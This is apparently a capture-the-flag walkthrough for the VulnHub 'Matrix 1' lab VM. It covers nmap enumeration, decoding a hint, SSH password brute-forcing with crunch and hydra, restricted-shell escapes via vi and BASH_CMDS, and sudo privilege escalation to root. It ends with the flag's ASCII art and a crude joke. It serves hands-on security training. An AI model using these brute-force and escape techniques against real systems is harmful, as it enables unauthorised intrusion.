[https://www.vulnhub.com/entry/matrix-1,259/](https://www.vulnhub.com/entry/matrix-1,259/?ref=rootandbeer.com)

Description: Matrix is a medium level boot2root challenge. The OVA has been tested on both VMware and Virtual Box.

-   Difficulty: Intermediate
-   Flags: Your Goal is to get root and read /root/flag.txt
-   Networking: DHCP: Enabled IP Address: Automatically assigned
-   Hint: Follow your intuitions ... and enumerate!

**Initial *[[Nmap]]* scan**
```bash
└─$ nmap -A 192.168.5.104    
22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
```

**In page source of 192.168.5.104:31337 :**

>ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=

```bash
└─$ echo ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= | base64 -d

echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
└─$ curl http://192.168.5.104:31337/Cypher.matrix
```

**Multi decoded @ [https://www.cachesleuth.com/multidecoder/](https://www.cachesleuth.com/multidecoder/?ref=rootandbeer.com) :**

> *You can enter into matrix as guest, with password k1ll0rXX*
> 
> *Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.*

**Generate wordlist with *crunch* & bruteforce SSH with *hydra***

```bash
└─$ crunch 8 8 -t k1ll0r@@ -o wordlist.txt -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space

└─$ hydra -l guest -P matrix.txt ssh://192.168.5.104:22
[22][ssh] host: 192.168.5.104  login: guest password: k1ll0r7n
```

```bash
└─$ ssh guest:k1ll0r7n@192.168.5.104
```

**We are in a restricted shell with limited commands. `echo` works and we can use it to list directory contents. We can also use "source" to read files**

```bash
guest@porteus:~$ echo *
Desktop Documents Downloads Music Pictures Public Videos prog
guest@porteus:~$ echo prog/*
prog/vi
```

```bash
guest@porteus:~$ source /etc/passwd
sh: trinity:x:1001:1001::/home/trinity:/bin/bash: No such file or directory
```

**Restricted shell escape using vi method:**

>[!Optional] Option 1
> ```bash
> guest@porteus:~$ vi -c ':!/bin/sh' /dev/null
> ```

>[!Optional] Option 2
>```bash
>guest@porteus:~$ BASH_CMDS[a]=/bin/sh;a
>```

**Privilege escalation via sudo:**

```bash
guest@porteus:~$ /usr/bin/sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

```bash
guest@porteus:~$ /usr/bin/sudo /bin/sh
```

**Enter guest password**

```bash
sh-4.4
root
```

**Capture the flag:**

```bash
sh-4.4
   _,-.                                                             
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
|`-._`-.\,-'_|  _,-'.                                               
     `-.|.-' | |`.-'|_     WHAT                                     
        |      |_|,-'_`.                                            
              |-._,-'  |     NO, ME NEITHER                         
         jrei | |    _,' 
              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION  
```

---